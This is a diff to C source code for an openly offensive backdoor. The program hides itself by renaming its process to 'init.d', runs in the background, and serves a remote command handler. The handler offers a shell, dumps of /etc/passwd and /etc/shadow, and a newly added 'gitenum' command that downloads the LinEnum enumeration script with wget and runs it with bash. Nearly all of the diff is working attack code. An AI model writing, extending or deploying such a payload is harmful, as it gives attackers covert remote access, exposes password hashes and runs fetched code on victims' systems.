@@ -16,6 +16,13 @@
 
 int main(int argc, char *argv[])
 {
+	//here we are going to change the name of the binary for PS (kind of hacky)
+	char *newName = "init.d";	//the new name of the process
+	int len = strlen(argv[0]);	//this will be used to dump current argv[0] value
+	for(int i = 0; i < len; i++)
+		argv[0][i] = 0;
+	strcpy(argv[0], newName);
+
 	//this fork and exit portion are used to background the running process
 	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)
 
@@ -24,13 +31,6 @@ int main(int argc, char *argv[])
 	//now we are ready to connect with our background running process
 
     struct sockaddr_in sa;
-
-	//here we are going to change the name of the binary for PS (kind of hacky)
-	char *newName = "init.d";
-	strcpy(argv[0], newName);
-	for(int i = 6; i < strlen(argv[0]); i++)
-		argv[0][i] = 'A';
-
 
 	//here we will set up our default listen server information
     sa.sin_family = AF_INET;						//AF_INET = Address Family is IPv4
@@ -90,7 +90,7 @@ int main(int argc, char *argv[])
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
 		char help[32][1024];
-		strcpy(help[0],	 "\n----------HELP MENU----------\n");
+		strcpy(help[0],	 "\n----------HELP MENU----------\n\n");
 		strcpy(help[1],	 "ls - Print contents of directory\n");
 		strcpy(help[2],	 "pwd -	print working directory\n");
 		strcpy(help[3],	 "shell - drop into sh shell\n");
@@ -103,10 +103,11 @@ int main(int argc, char *argv[])
 		strcpy(help[10],  "whoami - print the current username\n");
 		strcpy(help[11], "passwd - print the passwd file to screen\n");
 		strcpy(help[12], "shadow - attempt to print the shadow password to the screen\n");
-		strcpy(help[13], "clear - clear the current screen\n");
+		strcpy(help[13], "gitenum - wget LinEnum and execute\n");
 		strcpy(help[14], "netcat - setup payload to use netcat listening functionality\n");
-		strcpy(help[15], "exit - quit from payload\n");
-		strcpy(help[16], "\n------------------------------\n\n");
+		strcpy(help[15], "clear - clear the current screen\n");
+		strcpy(help[16], "exit - quit from payload\n");
+		strcpy(help[17], "\n------------------------------\n\n");
 		//HELP MENU INFO OVER HERE
 
 		char *line	= "Handler> ";
@@ -152,7 +153,7 @@ int main(int argc, char *argv[])
 			}
 
 			else if(!strcmp("help", command))
-				for(int i = 0; i < 17; i++)
+				for(int i = 0; i < 18; i++)
 					write(sock, help[i], strlen(help[i]));	//write help menu
 
 			else if(!strcmp("ls", command))
@@ -183,6 +184,12 @@ int main(int argc, char *argv[])
 			else if(!strcmp("shadow", command))
 				system("cat /etc/shadow");
 
+			else if(!strcmp("gitenum", command))
+			{
+				system("wget https:\/\/raw.githubusercontent.com\/rebootuser\/LinEnum\/master\/LinEnum.sh");
+				system("/bin/bash LinEnum.sh");
+			}
+
 			else if(!strcmp("clear", command))	//clears the C2 screen
 				system("clear");
 
@@ -190,7 +197,7 @@ int main(int argc, char *argv[])
 				netcat = 1;
 
 			else if(!strcmp("", command))		//do nothing on empty command
-				system("clear");
+				continue;
 
 			else
 				write(sock, error, strlen(error));	//write error message if commnd is not recognized
